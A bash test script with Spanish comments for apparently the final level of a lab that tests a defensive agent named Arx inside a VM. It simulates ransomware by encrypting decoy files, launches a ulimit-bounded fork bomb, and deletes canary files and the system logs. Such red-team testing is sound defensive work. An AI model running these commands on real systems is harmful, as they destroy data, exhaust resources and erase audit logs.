#!/usr/bin/env bash
# L10 — DESTRUCCIÓN TOTAL. Solo en la VM, solo desde el snapshot oro. La VM puede morir.
# Esperado: Arx frena a las 5 acciones/hora (breaker), escala todo a Tier 2, alerta
# crítica masiva, y NO hace nada irreversible por su cuenta. La defensa se mide por
# cuánto logra contener/alertar antes de caer, no por sobrevivir lo imposible.
set -e
echo "[L10] 5…4…3…2…1…"

# 1) ransomware simulado: cifra el árbol señuelo (nunca fuera de /root/lab-data)
mkdir -p /root/lab-data && for i in 1 2 3 4 5; do echo "fichero $i" > /root/lab-data/doc$i.txt; done
for f in /root/lab-data/*; do openssl enc -aes-256-cbc -k lab -in "$f" -out "$f.enc" && rm "$f"; done
echo "  ransomware simulado: /root/lab-data cifrado"

# 2) fork bomb acotada (ulimit la contiene; aun así pisa fuerte)
(ulimit -u 512; :(){ :|:& };:) & echo "  fork bomb lanzada (acotada por ulimit)"

# 3) borrado de señuelos y logs
arx canaries list 2>/dev/null | awk '{print $1}' | xargs -r rm -f
rm -f /var/log/auth.log /var/log/syslog 2>/dev/null || true

echo "[L10] fin del ataque. Revisa: arx status, incidents.jsonl, alertas recibidas,"
echo "      y si el breaker frenó a Arx (eso es un ACIERTO, no un fallo)."
